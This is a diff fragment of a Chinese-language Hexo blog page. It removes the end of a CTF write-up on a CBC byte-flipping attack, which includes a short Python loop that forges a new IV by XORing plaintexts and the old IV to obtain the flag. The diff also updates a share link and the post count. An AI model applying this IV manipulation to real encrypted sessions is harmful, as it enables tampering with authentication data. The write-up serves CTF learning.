&apos;a:2:&#123;s:8:&quot;userna&apos;#被损坏前正确的明文</span><br><span class="line">for i in range(16):</span><br><span class="line">    newIv += chr(ord(right[i])^ord(cipher[i])^ord(iv[i])) #这一步相当于把原来iv中不匹配的部分修改过来</span><br><span class="line">print urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure></p>
-<p><strong>5 再一次传参</strong><br>把新得到的iv值传入，得到flag<br><img src="/images/11/6.png" alt=""></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjul6evmf000gw8vjkig8yy7o" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjv4r4ryl001amcvjyib6a7r2" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -874,7 +875,7 @@ while flag:
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>31</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>32</strong><br>文章</div></a>
       <a href="/categories"><div><strong>3</strong><br>分类</div></a>
       <a href="/tags"><div><strong>14</strong><br>标签</div></a>
     </div>
